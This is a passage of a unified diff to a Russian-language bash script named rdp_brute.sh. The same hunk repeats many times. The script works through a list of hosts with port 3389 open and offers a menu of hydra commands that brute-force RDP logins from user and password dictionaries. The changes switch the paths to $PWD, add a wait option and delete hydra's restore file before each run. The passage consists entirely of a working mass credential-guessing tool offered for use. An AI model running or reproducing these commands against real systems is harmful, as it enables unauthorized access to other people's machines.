-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10266,6 +10834,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -10277,7 +10849,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10287,7 +10859,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10297,7 +10869,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10306,7 +10878,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10335,6 +10907,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -10346,7 +10922,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10356,7 +10932,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10366,7 +10942,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10375,7 +10951,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10404,6 +10980,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -10415,7 +10995,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10425,7 +11005,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10435,7 +11015,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10444,7 +11024,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10473,6 +11053,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -10484,7 +11068,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10494,7 +11078,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10504,7 +11088,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10513,7 +11097,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10542,6 +11126,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -10553,7 +11141,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10563,7 +11151,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10573,7 +11161,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10582,7 +11170,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10611,6 +11199,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -10622,7 +11214,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10632,7 +11224,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10642,7 +11234,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10651,7 +11243,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10680,6 +11272,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -10691,7 +11287,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10701,7 +11297,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10711,7 +11307,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10720,7 +11316,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10749,6 +11345,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -10760,7 +11360,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10770,7 +11370,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10780,7 +11380,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10789,7 +11389,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10818,6 +11418,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -10829,7 +11433,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10839,7 +11443,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10849,7 +11453,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10858,7 +11462,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10887,6 +11491,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -10898,7 +11506,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10908,7 +11516,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10918,7 +11526,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10927,7 +11535,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10956,6 +11564,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -10967,7 +11579,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10977,7 +11589,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10987,7 +11599,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10996,7 +11608,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11025,6 +11637,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -11036,7 +11652,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11046,7 +11662,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11056,7 +11672,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -11065,7 +11681,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
